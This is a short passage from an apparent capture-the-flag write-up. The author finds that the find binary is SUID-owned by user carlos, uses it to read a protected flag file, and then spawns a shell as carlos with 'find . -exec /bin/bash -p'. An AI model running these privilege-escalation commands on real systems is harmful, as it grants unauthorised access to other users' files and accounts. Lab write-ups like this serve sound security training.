And as expected, we can't simply get the flag here, but as i tried the simple command:

```bash
find / -name user.txt 2>/dev/null
/home/carlos/user.txt
```

So methinks that there is a way to get in there, even though i have no permissions to actually traverse to it. To get the flag i did the simple 

```bash
find / -name user.txt 2>/dev/null -exec cat {} + ;
```

And got the flag. After this, i searched for any file being from carlos and easy enough

```bash
ls -la /usr/bin/find
-rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
```

:) 

So then simply do the following:

```bash
find . -exec /bin/bash -p \;
```

(the -p is so it does not drop privileges, and the \; to avoid errors when interpreting by shell).

So now we are effectively [[carlos]]
